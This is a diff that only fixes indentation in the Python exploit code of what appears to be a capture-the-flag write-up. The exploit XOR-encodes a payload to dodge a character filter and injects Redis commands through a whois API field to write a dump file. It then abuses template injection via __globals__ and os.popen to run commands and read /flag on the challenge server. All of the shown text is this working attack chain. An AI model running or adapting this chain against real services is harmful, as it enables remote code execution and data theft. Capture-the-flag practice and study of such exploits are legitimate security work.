@@ -85,12 +85,12 @@ forbidden = set('/\\;\n|&`$!?*()"\'_ []<>{}#%=')
 allowed = set(chr(i) for i in range(32,127)) - forbidden
 s1, s2 = "", ""
 for c in target:
-for a in allowed:
-for b in allowed:
-if ord(a)^ord(b)==ord(c):
-s1+=a; s2+=b; break
-else: continue
-break
+    for a in allowed:
+        for b in allowed:
+            if ord(a)^ord(b)==ord(c):
+                s1+=a; s2+=b; break
+        else: continue
+        break
 print("S1="+s1)
 print("S2="+s2)
 </code></pre>
@@ -103,8 +103,8 @@ BASE = "http://7a927d5f73904ed1a421a84ef918aa690.chal2.teagod.tech:8003"
 s1 = "444944S444444e4444444e4444e4S44444e4444444e4444eSS44444e4444444e4444e4S44444e4444444e4444e44Se4444444e4444e94S44444e4444444e4444e49Se4444444e4444e444S44444e4444444e4444e4SeS44"
 s2 = "OOWVZR:SHU@@FMFQEAQG@KUFSGKWzHU@@FMFQEAQG@KUFSGK:zHU@@FMFQEAQG@KUFSGKSzHU@@FMFQEAQG@KUFSGKSQzMFQEAQG@KUFSGKVGzHU@@FMFQEAQG@KUFSGKDVzMFQEAQG@KUFSGKWYPzHU@@FMFQEAQG@KUFSGKFzMzII"
 def send(cmd):
-data = urllib.parse.urlencode({'domain': f"{cmd} -h 127.0.0.1 -p 6379"}).encode()
-urllib.request.urlopen(urllib.request.Request(f"{BASE}/api/whois", data=data))
+    data = urllib.parse.urlencode({'domain': f"{cmd} -h 127.0.0.1 -p 6379"}).encode()
+    urllib.request.urlopen(urllib.request.Request(f"{BASE}/api/whois", data=data))
 send("FLUSHDB")
 send("CONFIG SET dbfilename dump.tpl")
 send(f"SET k1 {s1}")
@@ -113,8 +113,8 @@ send("BITOP XOR pwn k1 k2")
 send("SAVE")
 time.sleep(1)
 params = urllib.parse.urlencode({
-'tpl': '../db/dump', 'c': '__class__', 'i': '__init__', 'g': '__globals__',
-'ge': 'get', 'os': 'os', 'po': 'popen', 'cmd': '/flag', 'r': 'read'
+    'tpl': '../db/dump', 'c': '__class__', 'i': '__init__', 'g': '__globals__',
+    'ge': 'get', 'os': 'os', 'po': 'popen', 'cmd': '/flag', 'r': 'read'
 })
 req = urllib.request.Request(f"{BASE}/render?{params}")
 print(urllib.request.urlopen(req).read().decode(errors='replace'))
